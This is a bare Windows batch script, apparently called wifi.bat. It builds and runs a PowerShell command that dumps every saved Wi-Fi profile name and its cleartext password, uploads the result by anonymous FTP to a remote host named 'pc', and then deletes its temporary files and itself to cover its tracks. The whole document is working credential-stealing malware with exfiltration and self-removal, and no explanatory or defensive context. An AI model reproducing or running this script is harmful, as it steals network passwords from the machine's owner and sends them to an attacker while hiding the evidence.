@echo off
if exist "%temp%\%computername% Wifi.txt" del "%temp%\%computername% Wifi.txt"
if exist "%temp%\send.dat" del "%temp%\send.dat"
if exist "%temp%\wifi.ps1" del "%temp%\wifi.ps1"
if exist "%temp%\check.txt" del "%temp%\check.txt"
echo (netsh wlan show profiles) ^| Select-String "\:(.+)$" ^| %%{$name=$_.Matches.Groups[1].Value.Trim(); $_} ^| %%{(netsh wlan show profile name="$name" key=clear)}  ^| Select-String "Key Content\W+\:(.+)$" ^| %%{$pass=$_.Matches.Groups[1].Value.Trim(); $_} ^| %%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} ^| Format-Table -AutoSize ^>^> "$env:temp\$env:computername Wifi.txt" >> "%temp%\wifi.ps1"
powershell.exe -ExecutionPolicy Bypass -File "%temp%\wifi.ps1"
echo send "%temp%\%computername% Wifi.txt" > "%temp%\send.dat"
echo quit >> "%temp%\send.dat"
ftp -i -v -A -s:"%temp%\send.dat" pc >> "%temp%\check.txt"
type "%temp%\check.txt" |find "Unknown host"
if errorlevel 1 (goto last) else (goto error)
:error
timeout 1
msg * /time:1 Error
del "wifi.bat"
exit
:last
timeout 1
del "%temp%\%computername% Wifi.txt"
del "%temp%\send.dat"
del "%temp%\wifi.ps1"
del "%temp%\check.txt"
del "wifi.bat"
exit